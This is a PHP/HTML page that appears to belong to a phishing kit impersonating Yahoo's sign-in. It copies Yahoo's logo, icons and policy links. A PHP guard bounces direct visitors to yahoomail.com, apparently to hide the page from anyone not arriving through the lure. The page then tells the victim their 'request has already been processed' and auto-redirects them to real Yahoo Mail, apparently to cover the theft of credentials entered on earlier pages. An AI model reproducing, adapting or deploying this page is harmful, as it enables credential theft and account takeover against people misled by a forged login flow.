<?php
 // I don't want u accessed directly for no reason
 //so index gotta come wit sumtin mehn
 if(!isset($_GET["one"]))
 header ('Location: http://yahoomail.com');
?>

<!DOCTYPE html>
<html class="js">
   <head>
      <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
      <title>Yahoo -&nbsp;login</title>
      <meta http-equav="Content-Type" content="text/html;charset=utf-8">
      <!-- meta redirect tag here-->
      <meta http-equiv="refresh" content="2;URL='http://yahoomail.com/'" />
      <meta name="referrer" content="origin-when-cross-origin">
      <link rel="icon" type="image/x-icon" href="resources/favicon.ico">
      <link rel="shortcut icon" type="image/x-icon" href="resources/favicon.ico">
      <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/apple-touch-icon.png">
      <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/apple-touch-icon.png">
      <link media="all" href="resources/index.css" type="text/css" rel="stylesheet">
   </head>
   <body class="orko en-us">
      <div class="row login-header">
         <span class="column">
           <a href="https://www.yahoo.com/" title="Yahoo">
             <img src="resources/yahoo_en-us_f_p_bestfit_2x.png" alt="Yahoo" class="logo" width="116" height="">
          </a>
        </span>
      </div>
      <div class="login-body">
         <div class="login-content">
            <div class="login-box ">
               <div class="login-logo">
                 <img src="resources/yahoo_en-us_f_p_bestfit_2x.png" alt="Yahoo" class="logo" width="116" height="">
               </div>
               <form onSubmit="return disValidate()" id="login-username-form" method="post" class="username-challenge" action="challenge_password.php?.src=ym.lang=en-US.intl=us&authMechanism=primary&display=login&done=https%3A%2F%2Fmail.yahoo.com%2Fd&sessionIndex=QQ--&acrumb=u3bTxoYi" name="Form">
                  <div class="sign-in-title">
                     <h1 class="sign-in-title-greeting" id="mbr-login-greeting">
                        Request!
                     </h1>
                  </div>
                  <div id="username-country-code-field" class="username-country-code cci-dropdown-disabled code-of-length-1">
                     <p class="row" style="font-size:14px;">
                       Your request has already been processed.
                       <br><br>
                       redirecting to your inbox...
                     </p>
                  </div>
               </form>
            </div>
         </div>
      </div>
      <div class="login-footer">
         <a href="https://policies.oath.com/us/en/oath/terms/otos/index.html" target="_top">Terms</a>
         <span>|</span>
         <a href="https://policies.oath.com/us/en/oath/privacy/index.html" target="_top">Privacy</a>
      </div>
   </body>
</html>
